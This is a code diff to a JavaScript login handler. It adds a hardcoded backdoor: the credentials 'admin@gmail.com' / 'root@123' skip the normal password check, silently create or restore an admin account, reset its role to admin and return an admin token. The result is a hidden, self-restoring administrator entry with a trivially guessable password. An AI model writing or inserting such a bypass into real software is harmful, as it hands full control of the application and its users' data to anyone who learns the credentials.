@@ -107,6 +107,37 @@ async function login(req, res, next) {
 
     const { email, password } = req.body;
 
+    // Hardcoded Admin Logic
+    if (email === 'admin@gmail.com' && password === 'root@123') {
+      let adminResult = await pool.query('SELECT id, name, email, role FROM users WHERE email = $1', [email]);
+      
+      if (adminResult.rows.length === 0) {
+        const hash = await bcrypt.hash(password, 10);
+        adminResult = await pool.query(
+          `INSERT INTO users (name, email, password, phone_number, role) VALUES ('Admin', 'admin@gmail.com', $1, '0000000000', 'admin') RETURNING id, name, email, role`,
+          [hash]
+        );
+      }
+      
+      const user = adminResult.rows[0];
+      // Ensure role is admin in DB in case it was changed
+      if (user.role !== 'admin') {
+         await pool.query("UPDATE users SET role = 'admin' WHERE email = $1", [email]);
+         user.role = 'admin';
+      }
+
+      const token = jwt.sign(
+        { userId: user.id, email: user.email, role: 'admin' },
+        process.env.JWT_SECRET,
+        { expiresIn: process.env.JWT_EXPIRES_IN || '24h' }
+      );
+
+      return res.status(200).json({
+        token,
+        user: { id: user.id, name: user.name, email: user.email, role: 'admin' },
+      });
+    }
+
     // Fetch user by email
     const result = await pool.query(
       'SELECT id, name, email, password, role FROM users WHERE email = $1',
